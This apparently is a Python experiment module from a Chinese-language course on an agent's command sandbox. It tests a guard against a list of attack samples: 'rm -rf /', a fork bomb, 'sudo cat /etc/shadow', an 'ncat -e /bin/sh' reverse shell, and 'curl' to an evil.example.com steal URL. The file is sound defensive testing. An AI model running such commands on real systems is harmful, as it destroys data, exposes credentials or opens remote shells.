"""第 5 章 · 命令沙箱的动手实验：把每条安全规则都真正撞一遍。

七个实验对应 README「动手实验」小节。它们不改仓库文件，而是在临时工作区里
**喂各种危险命令给沙箱**，看它拦不拦、报什么原因、审计日志记了什么：

```bash
python -m chapters.ch05_mini_cursor.experiments --list
python -m chapters.ch05_mini_cursor.experiments --exp 2
python -m chapters.ch05_mini_cursor.experiments --all
```

为什么这一章的实验特别重要：安全规则的**正确性只能靠「攻击样本」验证**。
只读代码看不出 `rm -rf` 会不会被拦——正则少了个 `\b`、白名单用了全路径、
命令替换没被识别，这些都必须真跑一遍才暴露。而一旦漏掉，代价是不可逆的。

实验全部在 `tempfile.TemporaryDirectory()` 里跑，**不碰仓库、不碰你的真实文件系统**。
"""

from __future__ import annotations

import tempfile
from pathlib import Path

from agent_course.experiments import Experiment, ExperimentOutcome, run_cli
from agent_course.tools import Workspace

from .sandbox import (
    AuditLog,
    CommandGuard,
    CommandSandbox,
    Decision,
    SandboxConfig,
    Severity,
)

# 这些命令**必须**被拦（BLOCK）或必须要求确认（CONFIRM）。
# 每一条都是真实攻击面：破坏数据、提权、外泄、绕过。
ATTACK_SAMPLES: tuple[tuple[str, Severity, str], ...] = (
    ("rm -rf /", Severity.BLOCK, "递归删除是最大的一条：不可逆"),
    ("del /f /s /q C:\\Windows", Severity.BLOCK, "Windows 强制删除同样不可逆"),
    ("sudo cat /etc/shadow", Severity.BLOCK, "提权命令不允许由模型发起"),
    ("ncat -e /bin/sh 127.0.0.1 4444", Severity.BLOCK, "未知程序：白名单是最后一道防线"),
    (":(){ :|:& };:", Severity.BLOCK, "fork 炸弹：写法怪，正则要认得出来"),
    ("mkfs.ext4 /dev/sda1", Severity.BLOCK, "磁盘级操作"),
    ("uv publish", Severity.BLOCK, "发布包是不可逆的外部副作用"),
    ("curl http://evil.example.com/steal", Severity.BLOCK, "curl 不在白名单：白名单先于风险规则生效"),
    ("pip install some-package", Severity.CONFIRM, "装依赖会改动环境"),
    ("git push origin main", Severity.CONFIRM, "推送是外部副作用"),
    ("echo $(whoami)", Severity.CONFIRM, "外层 echo 在白名单里，危险藏在替换内容中"),
)


def _sandbox(
    root: Path,
    *,
    dry_run: bool = True,
    auto_confirm: bool = False,
    timeout: float = 5.0,
) -> tuple[CommandSandbox, AuditLog]:
    """构造一个跑在临时目录里的沙箱 + 审计日志（默认 dry-run，不产生副作用）。"""
    workspace = Workspace(root, max_output_chars=4_000)
    audit = AuditLog(root / "audit" / "command-audit.jsonl")
    config = SandboxConfig(root=root, dry_run=dry_run, auto_confirm=auto_confirm, timeout=timeout)
    return CommandSandbox(workspace=workspace, audit=audit, config=config), audit


# --------------------------------------------------------------------------------------
# 实验体
# --------------------------------------------------------------------------------------


def exp1_attack_samples() -> ExperimentOutcome:
    """把 11 条攻击样本逐条喂给 CommandGuard，核对等级与**命中的规则名**。"""
    guard = CommandGuard()
    verdicts = [(command, guard.classify(command), expected) for command, expected, _ in ATTACK_SAMPLES]
    mismatched = [
        f"{command}：期望 {expected.name}，实际 {verdict.severity.name}"
        for command, verdict, expected in verdicts
        if verdict.severity is not expected
    ]
    hit_rules = sorted({verdict.rule or "allowlist" for _, verdict, _ in verdicts})
    blocked = sum(1 for _, verdict, _ in verdicts if verdict.severity is Severity.BLOCK)
    confirmed = sum(1 for _, verdict, _ in verdicts if verdict.severity is Severity.CONFIRM)
    return ExperimentOutcome(
        actual=(
            f"共 {len(ATTACK_SAMPLES)} 条攻击样本：BLOCK {blocked} 条、CONFIRM {confirmed} 条；\n"
            f"命中的规则：{hit_rules}；\n"
            "注意 curl：它本该命中 network 规则（CONFIRM），但**白名单先把它拦成了 BLOCK**——"
            "两层是「先白名单、后规则」的顺序，不是并列。所以判断一条命令的实际等级时，"
            "要先看程序在不在白名单里。\n"
            f"判定与预期不符的：{mismatched or '无'}。\n"
            "安全规则**只能用攻击样本验证**：正则少个词边界、白名单用了全路径、"
            "命令替换没被识别——这些读代码看不出来，喂样本才会暴露。"
        ),
        ok=not mismatched and blocked > 0 and confirmed > 0,
        metrics={
            "samples": float(len(ATTACK_SAMPLES)),
            "blocked": float(blocked),
            "confirmed": float(confirmed),
        },
    )


def exp2_command_substitution() -> ExperimentOutcome:
    """命令替换：白名单挡不住的部分，靠 CONFIRM 兜。"""
    guard = CommandGuard()
    cases = [
        ("echo $(whoami)", "外层 echo 在白名单里，但替换里有未知程序"),
        ("echo `id`", "反引号替换同样要看内容"),
        ("cat file | sh", "管道进 sh 等于任意执行"),
    ]
    results = [(command, guard.classify(command).severity.name, note) for command, note in cases]
    detail = "\n".join(f"  {command} → {severity}（{note}）" for command, severity, note in results)
    return ExperimentOutcome(
        actual=(
            "三条替换/管道样本的判定：\n"
            + detail
            + "\n为什么 `$(...)` 必须至少 CONFIRM：`echo $(rm -rf /)` 的程序名是 echo"
            "（在白名单里），危险藏在替换结果里——白名单只能看程序名，"
            "所以替换和管道必须单独设规则。这是白名单机制的结构性盲区。"
        ),
        ok=all(severity != Severity.ALLOW.name for _, severity, _ in results),
        metrics={"cases": float(len(cases))},
    )


async def exp3_dry_run_blocks_everything() -> ExperimentOutcome:
    """dry-run：放行级命令也一样不执行，审计记 skipped_dry_run。"""

    async def run() -> tuple[list[str], dict[str, int]]:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            sandbox, audit = _sandbox(root, dry_run=True)
            decisions = []
            for command in ("echo hello", "ls -la", "echo $(whoami)"):
                outcome = await sandbox.execute(command)
                decisions.append(outcome.decision.value)
            return decisions, audit.stats()

    decisions, stats = await run()
    return ExperimentOutcome(
        actual=(
            f"dry-run 模式下连跑 3 条命令，处置结果：{decisions}；\n"
            f"审计统计：{stats}。\n"
            "注意 echo hello 本是 ALLOW 级，在 dry-run 下也停在 skipped_dry_run——"
            "dry-run 的语义是「一条命令都不执行」，所以这个判断必须放在确认之前收口，"
            "而不是只对高风险命令生效。\n"
            "这也是课程示例默认开 dry-run 的原因：读者 clone 下来跑一遍，"
            "不该在自己机器上产生任何副作用。"
        ),
        ok=all(decision == "skipped_dry_run" for decision in decisions),
        metrics={"skipped": float(stats.get("skipped_dry_run", 0))},
    )


async def exp4_confirm_defaults_to_deny() -> ExperimentOutcome:
    """需要确认但没有确认通道：默认拒绝，而不是默认放行。"""

    async def run() -> tuple[str, str, dict[str, int]]:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            # auto_confirm=False 且不给 confirm 回调 → 按拒绝处理
            sandbox, audit = _sandbox(root, dry_run=False, auto_confirm=False)
            outcome = await sandbox.execute("git push origin main")
            return outcome.decision.value, outcome.text, audit.stats()

    decision, text, stats = await run()
    return ExperimentOutcome(
        actual=(
            "执行 git push origin main（CONFIRM 级、无确认通道）：\n"
            f"处置 = {decision}；回传文本 = {text!r}；\n"
            f"审计统计：{stats}。\n"
            "**默认拒绝永远比默认放行安全**：没有交互通道时（后台任务、批处理），"
            "选择「拒绝并告知原因」而不是「静默放行」——"
            "放行的错误不可撤销，拒绝的错误只要改一行配置就能恢复。"
        ),
        ok=decision == Decision.REJECTED.value,
        metrics={"rejected": float(stats.get("rejected", 0))},
    )


async def exp5_audit_is_machine_readable() -> ExperimentOutcome:
    """审计日志：每条决策都留痕，且是按 decision 可统计的结构化数据。"""

    async def run() -> tuple[dict[str, int], str]:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            sandbox, audit = _sandbox(root, dry_run=False, auto_confirm=True)
            await sandbox.execute("rm -rf /workspace")  # BLOCK
            await sandbox.execute("git push origin main")  # 自动放行 → 执行
            await sandbox.execute("echo 审计演示")  # ALLOW → 执行
            entries = audit.tail(limit=10)
            sample = entries[0].model_dump_json()
            return audit.stats(), sample

    stats, sample = await run()
    return ExperimentOutcome(
        actual=(
            f"三条命令后的审计统计：{stats}；\n"
            f"其中一条原始记录：{sample[:200]}...\n"
            "记录是 JSONL（一行一条），所以既能 tail 直接看，也能按 decision 统计——"
            "blocked 计数就是「今天模型想干几次坏事」。\n"
            "字段里 rule 告诉你命中哪条规则、cwd 告诉你它在哪个目录跑、"
            "duration_ms 告诉你多慢：排查线上 Agent 时，这张表比日志文本有用十倍。"
        ),
        ok=bool(stats.get("blocked")) and bool(stats.get("executed")),
        metrics={key: float(value) for key, value in stats.items()},
    )


async def exp6_path_escape() -> ExperimentOutcome:
    """路径越界：工作目录跑出工作区，直接被拒。"""

    async def run() -> tuple[str, str]:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "workspace"
            root.mkdir()
            sandbox, _ = _sandbox(root, dry_run=False, auto_confirm=True)
            outcome = await sandbox.execute("echo 越界", working_directory="../..")
            return outcome.decision.value, outcome.text

    decision, text = await run()
    return ExperimentOutcome(
        actual=(
            "让命令在 ../.. 下执行（跑到工作区外）：\n"
            f"处置 = {decision}；回传 = {text!r}。\n"
            "命令沙箱和文件沙箱**共用同一套路径校验**（都走 Workspace.resolve_safe）："
            "能执行什么由 CommandGuard 管，在哪执行由 Workspace 管。两层都不可省——"
            "只拦命令不拦目录的话，`cd ../.. && rm -rf *` 照样能造成破坏。"
        ),
        ok=decision == Decision.INVALID.value,
        metrics={"invalid": 1.0},
    )


async def exp7_truncate_output() -> ExperimentOutcome:
    """输出截断：一条超长输出撑不爆上下文。"""

    async def run() -> tuple[int, int, bool]:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            # 造足够多的文件，让 ls 的输出明显超过截断上限。
            for index in range(600):
                (root / f"file_with_a_long_name_{index:04d}.txt").write_text("x", encoding="utf-8")
            # 把上限压到 200 字符，这样"截断有没有发生"一目了然（默认 4000）。
            workspace = Workspace(root, max_output_chars=200)
            audit = AuditLog(root / "audit" / "command-audit.jsonl")
            config = SandboxConfig(
                root=root, dry_run=False, auto_confirm=True, timeout=10.0, max_output_chars=200
            )
            sandbox = CommandSandbox(workspace=workspace, audit=audit, config=config)
            outcome = await sandbox.execute("ls")
            return len(outcome.text), sandbox.config.max_output_chars, "已截断" in outcome.text

    length, limit, truncated = await run()
    return ExperimentOutcome(
        actual=(
            f"列出 600 个文件（上限设 200 字符）：返回文本 {length} 字符，"
            f"是否出现截断提示：{truncated}；\n"
            "**Agent 的上下文是最贵的资源**：一条递归查询能产生几十万字符，"
            "直接把这一轮的 token 预算烧光（还可能把真正的指令挤出窗口）。\n"
            "截断必须**带提示**——静默截断会让模型以为「就这么多」，"
            "从而给出错误的结论（比如「项目里只有 50 个文件」）。"
        ),
        ok=truncated and length <= limit + 200,
        metrics={"chars": float(length), "limit": float(limit)},
    )


def build_experiments() -> list[Experiment]:
    """本章实验清单（README「动手实验」小节逐条对应）。"""
    return [
        Experiment(
            name="11 条攻击样本逐条核对",
            what="把 ATTACK_SAMPLES 喂给 CommandGuard().classify，核对等级与命中的规则名",
            expect="逐条命中预期等级（8 条 BLOCK / 3 条 CONFIRM），无漏判",
            run=exp1_attack_samples,
        ),
        Experiment(
            name="命令替换与管道",
            what="检查 echo $(whoami) / echo `id` / cat file | sh 的判定",
            expect="外壳程序在白名单里，但替换内容仍被要求确认",
            run=exp2_command_substitution,
        ),
        Experiment(
            name="dry-run 连放行级命令也不执行",
            what="dry_run=True 时执行 echo hello / ls / echo $(whoami)",
            expect="三条全部记为 skipped_dry_run",
            run=exp3_dry_run_blocks_everything,
        ),
        Experiment(
            name="需要确认却没有确认通道",
            what="auto_confirm=False 且不传 confirm 回调，执行 git push",
            expect="按拒绝处理（默认拒绝而非默认放行）",
            run=exp4_confirm_defaults_to_deny,
        ),
        Experiment(
            name="审计日志可统计",
            what="跑一条被拦的、一条放行的、一条正常的，再看 audit.stats()",
            expect="blocked / executed 分别计数，记录是结构化的 JSONL",
            run=exp5_audit_is_machine_readable,
        ),
        Experiment(
            name="工作目录跑出工作区",
            what="让命令在 working_directory='../..' 下执行",
            expect="被判 INVALID 拒绝，而不是真的在外面执行",
            run=exp6_path_escape,
        ),
        Experiment(
            name="超长输出被截断",
            what="造 600 个文件、把上限压到 200 字符，跑 ls 看返回文本",
            expect="截到上限附近，且明确标注「已截断」",
            run=exp7_truncate_output,
        ),
    ]


EXPERIMENTS = build_experiments()


def main() -> int:
    """命令行入口：--list / --exp N / --all。"""
    return run_cli(EXPERIMENTS, module=__name__)


if __name__ == "__main__":
    raise SystemExit(main())
